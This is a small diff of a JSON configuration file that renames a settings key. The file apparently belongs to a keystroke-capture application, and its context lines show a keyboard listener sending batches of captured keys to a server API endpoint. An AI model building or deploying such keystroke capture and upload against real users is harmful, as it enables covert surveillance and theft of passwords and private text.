@@ -4,7 +4,7 @@
     "RegisterUserUri": "/api/Account/Register",
     "LoginUserUri": "/Token"
   },
-  "ListenersConfigs": {
+  "ListenersConfig": {
     "KeyboardListenerConfig": {
       "SendCapturedItemsThreshold": 20,
       "SendCapturedItemsDestinationUri": "/api/CapturedKeys/PostCapturedKeys",
